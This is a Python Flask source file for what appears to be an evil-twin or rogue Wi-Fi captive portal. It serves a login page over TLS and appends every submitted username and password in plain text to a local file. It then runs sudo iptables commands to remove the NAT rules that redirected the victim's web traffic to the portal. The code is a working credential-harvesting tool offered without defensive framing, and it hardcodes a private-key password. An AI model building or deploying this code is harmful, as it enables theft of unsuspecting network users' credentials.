from flask import Flask, render_template, request
import subprocess
import time
import sys
from flask_sslify import SSLify
import ssl

app = Flask(__name__)
sslify = SSLify(app)
if len(sys.argv) > 2:
    iface_wifi = sys.argv[1]
    portal_address = sys.argv[2]
    print(f"the wifi is {iface_wifi}")
    print(f"the portal address is {portal_address}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Get the submitted username and password
    username = request.form['username']
    password = request.form['password']

    with open("info.txt", "a") as f:
        f.write(f"username: {username} \npassword: {password}\n")


    subprocess.call(
        ['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '80', '-j',
         'DNAT', '--to-destination', portal_address])


    subprocess.call(
        ['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '443', '-j',
         'DNAT', '--to-destination', portal_address])

    return {"answer": "hello"}

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain('cert.pem', keyfile='key.pem', password="ariel")
    app.run(host='0.0.0.0', port=5000, ssl_context=context)